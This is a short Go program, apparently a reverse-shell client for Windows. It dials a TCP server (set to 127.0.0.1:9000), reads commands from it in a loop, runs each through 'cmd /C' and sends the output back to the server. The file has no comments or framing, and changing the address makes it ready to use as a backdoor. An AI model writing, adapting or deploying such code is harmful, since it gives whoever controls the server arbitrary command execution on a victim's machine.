package main

import(
	"fmt"
	"net"
	"os"
	"os/exec"
	"bufio"
)


func connect(addr string) net.Conn {
	conn, err := net.Dial("tcp",addr)
	if err != nil {
		os.Exit(1)
	}
	return conn
}

func sendtoserv(msg string, conn net.Conn) {
	_, err := conn.Write([]byte(msg))
	if err != nil {
		os.Exit(1)
	}
}

func exec_cmd(cmd string, conn net.Conn) {
	args := append([]string{"/C"},[]string{cmd}...)
	command := exec.Command("cmd",args...)
	output, err := command.Output()
	if err != nil {
		sendtoserv("An error has been raised while trying to run the command : "+cmd, conn)
		return
	}
	fmt.Println(string(output))
	sendtoserv(string(output)+"¤",conn)
}

func get_cmd(conn net.Conn) string {
	recv := bufio.NewReader(conn)
	data, err := recv.ReadString('\n')
	if err != nil {
		os.Exit(1)
	}
	return string(data)
}

func main() {
	const SERV = "127.0.0.1:9000"
	conn := connect(SERV)
	for {
		cmd := get_cmd(conn)
		exec_cmd(cmd, conn)
	}
}
